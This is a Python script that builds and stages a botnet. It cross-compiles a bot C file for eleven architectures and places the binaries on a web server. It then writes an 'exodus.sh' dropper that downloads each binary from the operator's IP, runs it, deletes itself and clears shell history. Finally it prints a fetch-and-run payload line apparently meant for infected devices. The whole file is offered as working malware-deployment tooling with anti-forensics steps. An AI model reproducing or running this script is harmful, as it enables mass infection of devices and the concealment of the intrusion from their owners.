import subprocess
import urllib.request
import sys
import os


if len(sys.argv) < 3:
    print("\x1b[1;95mIncorrect Usage!\x1b[0m")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \x1b[0m")
    exit(1)

ip = sys.argv[2]
bot = sys.argv[1]
Rust = input("\x1b[1;95mReady To Install Cross Compilers? (Press Enter): \x1b[0m")

arch_map = [
    ("x86", "gcc", "gcc"),
    ("x32", "gcc", "gcc"),
    ("mips", "cross-compiler-mips", "mips-gcc"),
    ("mipsel", "cross-compiler-mipsel", "mipsel-gcc"),
    ("arm7", "cross-compiler-armv7l", "armv7l-gcc"),
    ("sh4", "cross-compiler-sh4", "sh4-gcc"),
    ("arm6", "cross-compiler-armv6l", "armv6l-gcc"),
    ("ppc", "cross-compiler-powerpc", "powerpc-gcc"),
    ("m68k", "cross-compiler-m68k", "m68k-gcc"),
    ("arm4", "cross-compiler-armv4l", "armv4l-gcc"),
    ("arm5", "cross-compiler-armv5l", "armv5l-gcc")
]

getarch = [
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mips.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mipsel.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sh4.tar.bz2',
    'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-m68k.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv7l.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv4l.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv5l.tar.bz2'
]

ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-sh4",
       "cross-compiler-armv6l",
       "cross-compiler-powerpc",
       "cross-compiler-m68k",
       "cross-compiler-armv7l",
       "cross-compiler-armv4l",
       "cross-compiler-armv5l"]

def run(cmd):
    subprocess.call(cmd, shell=True)

run("echo '' >> " + bot)

run("rm -rf cross-compiler-*")
for arch in getarch:
    print(f"Downloading: {arch}")
    run("wget " + arch + " --no-check-certificate")
    run("tar -xvf *tar.bz2")
    run("rm -rf *tar.bz2")

run("rm -rf bins")
run("mkdir -p bins")

for output_name, compiler_type, compiler_cmd in arch_map:
    if compiler_type == "gcc":
        print(f"Compiling: {output_name} using {compiler_cmd}")
        run(f"gcc -std=c99 -static -pthread -o bins/{output_name} {bot} -lpthread")
        print(f"Compiled: {output_name} using {compiler_cmd}")
    else:
        if os.path.exists(compiler_type):
            actual_compiler = f"./{compiler_type}/bin/{compiler_cmd}"
            if os.path.exists(actual_compiler):
                print(f"Compiling: {output_name} using {actual_compiler}")
                run(f"{actual_compiler} -std=c99 -static -pthread -o bins/{output_name} {bot} -lpthread")
                print(f"Compiled: {output_name} using {actual_compiler}")

# Create proper web directories
run("mkdir -p /var/www/html/bins")

# Generate exodus.sh in the correct location
run('echo "#!/bin/bash" > /var/www/html/exodus.sh')
run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /" >> /var/www/html/exodus.sh')

# Correct URLs to match actual directory structure
run('echo "wget http://' + ip + '/bins/x86" >> /var/www/html/exodus.sh')
run('echo "wget http://' + ip + '/bins/x32" >> /var/www/html/exodus.sh')
run('echo "wget http://' + ip + '/bins/mips" >> /var/www/html/exodus.sh')
run('echo "wget http://' + ip + '/bins/mipsel" >> /var/www/html/exodus.sh')
run('echo "wget http://' + ip + '/bins/arm7" >> /var/www/html/exodus.sh')
run('echo "wget http://' + ip + '/bins/sh4" >> /var/www/html/exodus.sh')
run('echo "wget http://' + ip + '/bins/arm6" >> /var/www/html/exodus.sh')
run('echo "wget http://' + ip + '/bins/ppc" >> /var/www/html/exodus.sh')
run('echo "wget http://' + ip + '/bins/m68k" >> /var/www/html/exodus.sh')
run('echo "wget http://' + ip + '/bins/arm4" >> /var/www/html/exodus.sh')
run('echo "wget http://' + ip + '/bins/arm5" >> /var/www/html/exodus.sh')

# Permissions section
run('echo "chmod +x x86 x32 mips mipsel arm7 sh4 arm6 ppc m68k arm4 arm5" >> /var/www/html/exodus.sh')

# Execution section
run('echo "./x86 || true &" >> /var/www/html/exodus.sh')
run('echo "./x32 || true &" >> /var/www/html/exodus.sh')
run('echo "./mips || true &" >> /var/www/html/exodus.sh')
run('echo "./mipsel || true &" >> /var/www/html/exodus.sh')
run('echo "./arm7 || true &" >> /var/www/html/exodus.sh')
run('echo "./sh4 || true &" >> /var/www/html/exodus.sh')
run('echo "./arm6 || true &" >> /var/www/html/exodus.sh')
run('echo "./ppc || true &" >> /var/www/html/exodus.sh')
run('echo "./m68k || true &" >> /var/www/html/exodus.sh')
run('echo "./arm4 || true &" >> /var/www/html/exodus.sh')
run('echo "./arm5 || true &" >> /var/www/html/exodus.sh')

# Cleanup section
run('echo "sleep 10" >> /var/www/html/exodus.sh')
run('echo "rm -f exodus.sh" >> /var/www/html/exodus.sh')
run('echo "rm -f x86 x32 mips mipsel arm7 sh4 arm6 ppc m68k arm4 arm5" >> /var/www/html/exodus.sh')
run('echo "history -c" >> /var/www/html/exodus.sh')

# Move compiled binaries to correct directory
run("cp bins/* /var/www/html/bins/")

print("Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/exodus.sh; chmod +x exodus.sh; ./exodus.sh; history -c")
print("\x1b[1;36mSuccessfully cross compiled!\x1b[0m")